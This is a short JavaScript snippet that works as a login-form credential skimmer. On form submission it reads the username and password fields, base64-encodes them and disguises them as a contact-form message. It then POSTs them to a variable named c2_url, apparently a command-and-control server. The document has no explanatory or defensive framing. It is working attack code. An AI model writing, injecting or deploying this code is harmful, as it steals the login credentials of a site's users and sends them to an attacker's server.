const form = document.querySelector('form');

form.addEventListener("submit", event => {
    const username = document.querySelector('#username').value;
    const password = document.querySelector('#password').value;


    const jsonData = {
        input1: username,
        input2: password
    };

    const encodedMessage = btoa(JSON.stringify(jsonData));

    const data = new FormData();
    data.append('name', 'test');
    data.append('email', 'b64@example.com');
    data.append('message', encodedMessage);

    fetch(`${c2_url}/contact`, {
        method: 'POST',
        body: data,
    });

});